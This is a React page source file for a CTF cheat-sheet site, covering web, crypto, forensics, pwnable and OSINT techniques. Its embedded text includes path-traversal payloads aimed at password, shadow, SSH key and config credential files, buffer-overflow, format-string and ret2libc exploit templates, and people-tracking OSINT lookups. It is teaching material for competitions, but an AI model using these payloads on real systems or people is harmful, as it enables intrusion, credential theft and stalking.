'use client'
import React, { useState } from 'react'
import Link from 'next/link'

const CATEGORIES = [
  {
    name: 'WEB', color: '#00d4ff',
    items: [
      { title: 'First steps', content: `# ALWAYS run these first on web challenges:
# 1. View page source (Ctrl+U)
# 2. Check robots.txt, sitemap.xml
# 3. Check /admin, /.git, /.env, /backup
# 4. Look at cookies (any base64? decode it)
# 5. Check JS files for API keys, endpoints, comments
# 6. Run gobuster for hidden directories
# 7. Check all form inputs for SQLi, XSS
# 8. Check parameters for LFI, IDOR, SSRF` },
      { title: 'LFI/Path Traversal', content: `# Local File Inclusion payloads:
../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/proc/self/environ   # may contain env vars
/proc/self/fd/0      # stdin
php://filter/convert.base64-encode/resource=index.php  # read PHP source
php://input          # POST body as file (+ code in POST body)

# Interesting files:
/etc/passwd          # users
/etc/shadow          # password hashes (needs root)
/etc/hosts           # hostname mappings
/proc/net/tcp        # network connections (hex encoded)
~/.ssh/id_rsa        # SSH private key
/var/www/html/config.php  # DB credentials` },
      { title: 'Common CTF Flags', content: `# Flag formats:
CTF{...}, flag{...}, HTB{...}, picoCTF{...}, DUCTF{...}

# Where flags hide:
# HTML source comments: <!-- flag: ... -->
# HTTP response headers: X-Flag: ...
# Cookies: Set-Cookie: flag=...
# Base64 in page: find then decode
# Exif metadata in images
# Source code of JS files
# Error messages
# Debug endpoints /debug, /test, /info` },
    ]
  },
  {
    name: 'CRYPTO', color: '#ffb347',
    items: [
      { title: 'Identify the cipher', content: `# Classic ciphers:
# Only letters, no numbers → probably Caesar/Vigenere/substitution
# Lots of symbols → probably substitution cipher  
# Looks like English but shifted → Caesar cipher
# CyberChef: https://gchq.github.io/CyberChef/

# Modern crypto:
# Long hex string → MD5 (32), SHA1 (40), SHA256 (64), SHA512 (128)
# rO0AB... (base64) → Java serialized object
# eyJ... → JWT (header.payload.signature)
# -----BEGIN... → PEM encoded key or cert

# Online tools:
# https://www.dcode.fr → 200+ cipher decoders
# https://quipqiup.com → frequency analysis
# https://cyberchef.io → Swiss army knife
# https://crackstation.net → hash lookup` },
      { title: 'XOR decryption', content: `# XOR is reversible: plaintext XOR key = ciphertext
# If you have ciphertext and key: ciphertext XOR key = plaintext

python3 -c "
ct = bytes.fromhex('4c415443454b')
key = b'A'
print(bytes([c ^ key[i % len(key)] for i, c in enumerate(ct)]))
"

# Single-byte XOR brute force:
python3 -c "
ct = bytes.fromhex('YOUR_HEX_HERE')
for key in range(256):
    pt = bytes([c ^ key for c in ct])
    if all(32 <= b <= 126 for b in pt):
        print(f'Key {key}: {pt.decode()}')
"

# Multi-byte XOR (repeated key):
# 1. Guess key length (Kasiski test, IoC)
# 2. Split ciphertext into groups by key position
# 3. Brute force each group as single-byte XOR` },
      { title: 'RSA Attacks', content: `# Common RSA CTF attacks:
# Small n: factorise directly with factordb.com
# Small e (e=3): cube root of ciphertext if m^e < n
# Known factors: p * q = n, if p or q known → compute private key
# Wiener attack: very small private key d
# Fermat factorisation: p and q are close together

python3 -c "
# Basic RSA decrypt (if you have p, q, e):
from Crypto.Util.number import inverse
p, q, e = 17, 23, 65537  # replace with CTF values
n = p * q
phi = (p-1) * (q-1)
d = inverse(e, phi)
ct = 12345  # ciphertext
print(pow(ct, d, n))  # decrypted message
"

# Tools:
# RsaCtfTool: python3 RsaCtfTool.py --publickey pub.pem --private
# factordb.com: online factorisation database` },
    ]
  },
  {
    name: 'FORENSICS', color: '#bf5fff',
    items: [
      { title: 'File investigation', content: `# File type check:
file suspicious_file
hexdump -C suspicious_file | head -4

# Check file magic bytes:
# FF D8 FF = JPEG
# 89 50 4E 47 = PNG
# 50 4B 03 04 = ZIP (or DOCX/XLSX/JAR)
# 47 49 46 = GIF
# 25 50 44 46 = PDF

# Extract metadata:
exiftool file.jpg
exiftool -GPS* file.jpg   # GPS coordinates

# Strings in file:
strings -n 8 file.bin | grep -i flag

# Binwalk — find embedded files:
sudo apt install binwalk
binwalk file.bin           # identify embedded files
binwalk -e file.bin        # extract embedded files
binwalk -e --dd='.*' file  # extract everything` },
      { title: 'Steganography', content: `# Image steganography tools:
sudo apt install steghide stegseek

# steghide (hides data in JPEG/BMP/WAV/AU):
steghide extract -sf image.jpg -p ""    # empty password
steghide extract -sf image.jpg -p flag  # try common passwords
stegseek image.jpg /usr/share/wordlists/rockyou.txt  # brute force

# zsteg (PNG/BMP LSB steganography):
gem install zsteg
zsteg -a image.png    # try all methods
zsteg image.png       # basic check

# stegsolve (Java tool — visual analysis):
# Download: stegsolve.jar
# java -jar stegsolve.jar
# File → Open → cycle through bit planes

# LSB extraction (manual):
python3 -c "
from PIL import Image
img = Image.open('image.png')
pixels = list(img.getdata())
bits = [pixel[0] & 1 for pixel in pixels]
chars = [bits[i:i+8] for i in range(0, len(bits), 8)]
text = ''.join([chr(int(''.join(map(str, c)), 2)) for c in chars])
print(text[:100])
"` },
      { title: 'Network/PCAP analysis', content: `# Wireshark filters for CTF:
# HTTP traffic: http
# DNS queries: dns  
# FTP: ftp
# Credentials: ftp contains "PASS"
# HTTP forms: http.request.method == "POST"
# Specific IP: ip.addr == 192.168.1.1

# Extract files from PCAP:
# File → Export Objects → HTTP (for HTTP downloads)
# File → Export Objects → SMB (for SMB transfers)

# Follow TCP stream:
# Right-click packet → Follow → TCP Stream
# Shows complete conversation

# tshark (CLI wireshark):
tshark -r capture.pcap -T fields -e http.request.uri  # URLs
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# NetworkMiner (Windows) — automatic file extraction from PCAP` },
    ]
  },
  {
    name: 'PWNABLE', color: '#ff4136',
    items: [
      { title: 'Buffer overflow basics', content: `# Find buffer overflow:
python3 -c "print('A' * 100)" | ./binary  # crash?
python3 -c "print('A' * 200)" | ./binary  # segfault?

# Find exact offset with cyclic pattern:
# In GDB:
python3 -c "
import struct
# Generate cyclic pattern:
pattern = b''
for i in range(26):
    for j in range(26):
        pattern += bytes([65+i, 65+j, 65+i, 65+j])
print(pattern[:200].decode())
"
# Or use: msf-pattern_create -l 200
# Run binary, crash, note EIP/RIP value
# Find offset: msf-pattern_offset -q VALUE

# Basic 32-bit BOF exploit:
python3 -c "
import struct
offset = 72     # bytes to reach return address
ret_addr = 0x08048400  # address to jump to
payload = b'A' * offset
payload += struct.pack('<I', ret_addr)  # little-endian
print(payload.decode('latin-1'))
" | ./binary` },
      { title: 'Format string', content: `# Format string vulnerability:
# Vulnerable: printf(user_input);
# Safe: printf("%s", user_input);

# Test: input %x.%x.%x
# If you see hex values printed → format string vuln

# Leak stack values:
%p.%p.%p.%p      # print pointers
%08x.%08x        # print hex padded

# Read specific stack position:
%7$p             # read 7th argument

# Leak a string from memory:
%s               # read as string (may crash if not valid ptr)
%7$s             # read 7th position as string

# Write to memory (advanced):
%n               # write number of chars printed to pointer arg
# Used to overwrite return address, GOT entries

# Find offset to your input:
# Input: AAAA%p.%p.%p.%p...
# Look for 0x41414141 (AAAA) in output → that position is your offset` },
      { title: 'Ret2libc / ROP', content: `# When stack is non-executable (NX bit):
# Can't inject shellcode → use existing code

# Ret2libc:
# Overwrite return address with system() address
# Put "/bin/sh" string address in argument

# Find libc base (need to leak address first):
# Leak puts@GOT → calculate libc base → find system/bin_sh

python3 -c "
# After leaking libc base:
libc_base = 0x...  # leaked address - libc offset
system_offset = 0x04f420  # from readelf -s libc.so | grep system
bin_sh_offset = 0x1b3e9a  # strings -a -t x libc.so | grep /bin/sh

system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

import struct
payload = b'A' * OFFSET
payload += struct.pack('<Q', system)  # 64-bit
payload += struct.pack('<Q', 0)       # return addr (after system)
payload += struct.pack('<Q', bin_sh)  # /bin/sh arg
print(payload.decode('latin-1'))
"

# Tools: pwntools, ROPgadget, ropper
# pip install pwntools
# ROPgadget --binary ./binary --rop` },
    ]
  },
  {
    name: 'OSINT/MISC', color: '#00ff41',
    items: [
      { title: 'Reverse image search', content: `# Multiple engines — use all:
# Google Images: images.google.com → camera icon
# TinEye: tineye.com
# Bing Visual Search
# Yandex Images (best for faces): yandex.com/images
# Google Lens: lens.google.com

# EXIF data from images:
exiftool image.jpg
# Look for: GPS coords, camera model, date taken, software

# Identify location from image:
# GeoGuessr-style: look for road signs, architecture, vegetation, cars
# Building style, power lines, license plates

# Reverse search for people:
# PimEyes (pimeyes.com) — face search
# Social media → profile picture reverse search` },
      { title: 'Username / profile investigation', content: `# Username across platforms:
sherlock username
maigret username

# Email investigation:
# holehe email@example.com → check registrations
# hunter.io → find professional emails
# hibp → check breach data

# Social media deep dive:
# Twitter: twitter.com/search?q=from:username
# LinkedIn: site:linkedin.com/in "person name"
# GitHub: github.com/username → check repos, gists, emails in commits

# Archive/historical:
# Wayback Machine: web.archive.org
# Google cache: cache:url
# Archive.today: archive.ph

# Phone number:
# truecaller.com
# sync.me
# Google the number: "555-1234"` },
      { title: 'Encoding recognition', content: `# Quick encoding identification:

# Base64: only A-Z a-z 0-9 +/= characters, length multiple of 4
echo "SGVsbG8=" | base64 -d  # decode

# Hex: only 0-9 a-f characters
echo "48656c6c6f" | xxd -r -p  # decode

# Binary: only 0s and 1s
python3 -c "print(bytes([int('01001000',2)]))"

# Morse: dots and dashes
# . = E, .. = I, ... = S, .... = H, - = T, -- = M

# ROT13: only shifts letters
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# URL encoded: %XX sequences
python3 -c "import urllib.parse; print(urllib.parse.unquote('%48%65%6C%6C%6F'))"

# CyberChef magic: gchq.github.io/CyberChef
# Drag "Magic" operation → paste mystery text → it auto-detects` },
    ]
  },
]

export default function CTFPage() {
  const [activeCategory, setActiveCategory] = useState('WEB')
  const [expandedItem, setExpandedItem] = useState<string | null>(null)

  const cat = CATEGORIES.find(c => c.name === activeCategory)!

  return (
    <div>
      <div style={{ marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>GHOSTNET // REFERENCE</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: '#00ff41', margin: '0.5rem 0', textShadow: '0 0 20px rgba(0,255,65,0.3)' }}>CTF TOOLKIT</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
          Quick reference for CTF competitions · Web · Crypto · Forensics · Pwnable · OSINT
        </p>
        <div style={{ marginTop: '12px', background: 'rgba(0,255,65,0.03)', border: '1px solid rgba(0,255,65,0.12)', borderRadius: '4px', padding: '10px 14px' }}>
          <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#00ff41', letterSpacing: '0.1em', marginRight: '8px' }}>WHAT IS A CTF</span>
          <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a6a5a', lineHeight: 1.6 }}>
            Capture The Flag competitions are legal hacking puzzles where you find a hidden &quot;flag&quot; string (e.g. <code style={{ color: '#00ff41', background: 'rgba(0,255,65,0.08)', padding: '1px 5px', borderRadius: '2px' }}>HTB{'{'flag{'}'}</code>) by solving security challenges. Categories: <strong style={{ color: '#8a9a8a' }}>WEB</strong> (find SQLi, XSS, IDOR bugs), <strong style={{ color: '#8a9a8a' }}>CRYPTO</strong> (break weak ciphers, RSA), <strong style={{ color: '#8a9a8a' }}>FORENSICS</strong> (analyse files, network captures), <strong style={{ color: '#8a9a8a' }}>PWNABLE</strong> (exploit programs with memory bugs). Click a category below to see cheatsheets. Start with <strong style={{ color: '#8a9a8a' }}>picoCTF</strong> if you are new — it is beginner-friendly and always available.
          </span>
        </div>
      </div>

      {/* CTF platforms */}
      <div style={{ display: 'flex', gap: '1px', marginBottom: '1.5rem', background: '#1a2e1e', borderRadius: '6px', overflow: 'hidden', border: '1px solid #1a2e1e' }}>
        {[
          { name: 'picoCTF', url: 'https://picoctf.org', desc: 'Best starter', color: '#00ff41' },
          { name: 'HackTheBox CTF', url: 'https://ctf.hackthebox.com', desc: 'Competitive', color: '#00ff41' },
          { name: 'CTFtime', url: 'https://ctftime.org', desc: 'All events', color: '#00ff41' },
          { name: 'pwn.college', url: 'https://pwn.college', desc: 'Binary/pwn', color: '#ff4136' },
          { name: 'cryptohack', url: 'https://cryptohack.org', desc: 'Crypto focus', color: '#ffb347' },
          { name: 'Ringzer0', url: 'https://ringzer0ctf.com', desc: 'Always open', color: '#00d4ff' },
        ].map((p, i) => (
          <a key={i} href={p.url} target="_blank" rel="noopener noreferrer" style={{ textDecoration: 'none', flex: 1, background: '#0e1410', padding: '10px 12px' }}>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', fontWeight: 700, color: p.color, marginBottom: '2px' }}>{p.name}</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a5a3a' }}>{p.desc}</div>
          </a>
        ))}
      </div>

      {/* Category tabs */}
      <div style={{ display: 'flex', gap: '4px', marginBottom: '1.5rem' }}>
        {CATEGORIES.map(cat => (
          <button key={cat.name} onClick={() => setActiveCategory(cat.name)} style={{
            fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', letterSpacing: '0.15em',
            padding: '6px 16px', borderRadius: '3px', cursor: 'pointer',
            background: activeCategory === cat.name ? `${cat.color}18` : 'transparent',
            border: `1px solid ${activeCategory === cat.name ? `${cat.color}55` : '#1a2e1e'}`,
            color: activeCategory === cat.name ? cat.color : '#3a5a3a',
          }}>{cat.name}</button>
        ))}
      </div>

      {/* Items */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '1px', background: '#1a2e1e', borderRadius: '6px', overflow: 'hidden', border: '1px solid #1a2e1e' }}>
        {cat.items.map((item, i) => {
          const key = `${cat.name}-${i}`
          const open = expandedItem === key
          return (
            <div key={i} style={{ background: '#0e1410' }}>
              <div onClick={() => setExpandedItem(open ? null : key)} style={{ padding: '14px 16px', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderLeft: `3px solid ${cat.color}` }}>
                <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', fontWeight: 700, color: cat.color }}>{item.title}</span>
                <span style={{ color: cat.color, opacity: 0.5, fontSize: '10px' }}>{open ? '▼' : '▶'}</span>
              </div>
              {open && (
                <div style={{ background: '#080c0a', borderTop: '1px solid #1a2e1e', padding: '0' }}>
                  <pre style={{ background: '#050805', margin: '0', padding: '1.25rem', overflow: 'auto', color: cat.color, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre-wrap' as const }}>
                    {item.content}
                  </pre>
                </div>
              )}
            </div>
          )
        })}
      </div>

      {/* Tools quick reference */}
      <div style={{ marginTop: '1.5rem', background: '#0e1410', border: '1px solid #1a2e1e', borderRadius: '6px', padding: '1.25rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>ESSENTIAL CTF TOOLS</div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: '8px' }}>
          {[
            { name: 'CyberChef', url: 'https://gchq.github.io/CyberChef', desc: 'Encoding/decoding everything' },
            { name: 'dcode.fr', url: 'https://www.dcode.fr', desc: '200+ cipher decoders' },
            { name: 'CrackStation', url: 'https://crackstation.net', desc: 'Hash lookup database' },
            { name: 'FactorDB', url: 'http://factordb.com', desc: 'Integer factorisation' },
            { name: 'gdb-peda', url: 'https://github.com/longld/peda', desc: 'Enhanced GDB for pwn' },
            { name: 'pwntools', url: 'https://docs.pwntools.com', desc: 'Python pwn library' },
            { name: 'RsaCtfTool', url: 'https://github.com/Ganapati/RsaCtfTool', desc: 'Automated RSA attacks' },
            { name: 'stegseek', url: 'https://github.com/RickdeJager/stegseek', desc: 'Fast steghide cracker' },
            { name: 'binwalk', url: 'https://github.com/ReFirmLabs/binwalk', desc: 'Embedded file extraction' },
            { name: 'pwndbg', url: 'https://github.com/pwndbg/pwndbg', desc: 'GDB plugin for exploit dev' },
            { name: 'Ghidra', url: 'https://ghidra-sre.org', desc: 'Free NSA decompiler' },
            { name: 'radare2', url: 'https://rada.re', desc: 'Open-source reverse engineering' },
          ].map((tool, i) => (
            <a key={i} href={tool.url} target="_blank" rel="noopener noreferrer" style={{ textDecoration: 'none', padding: '8px 10px', background: '#080c0a', border: '1px solid #1a2e1e', borderRadius: '4px' }}>
              <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', fontWeight: 700, color: '#00ff41', marginBottom: '2px' }}>{tool.name}</div>
              <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#3a5a3a' }}>{tool.desc}</div>
            </a>
          ))}
        </div>
      </div>

      <div style={{ marginTop: '2rem', paddingTop: '1.5rem', borderTop: '1px solid #1a2e1e', display: 'flex', gap: '1rem' }}>
        <Link href="/tools" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#00ff41', padding: '8px 20px', border: '1px solid rgba(0,255,65,0.3)', borderRadius: '4px', background: 'rgba(0,255,65,0.05)' }}>
          TOOL REFERENCE →
        </Link>
        <Link href="/payload" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#bf5fff', padding: '8px 20px', border: '1px solid rgba(191,95,255,0.3)', borderRadius: '4px', background: 'rgba(191,95,255,0.05)' }}>
          PAYLOAD GENERATOR →
        </Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', padding: '8px 20px', border: '1px solid #1a2e1e', borderRadius: '4px' }}>
          ← DASHBOARD
        </Link>
      </div>
    </div>
  )
}
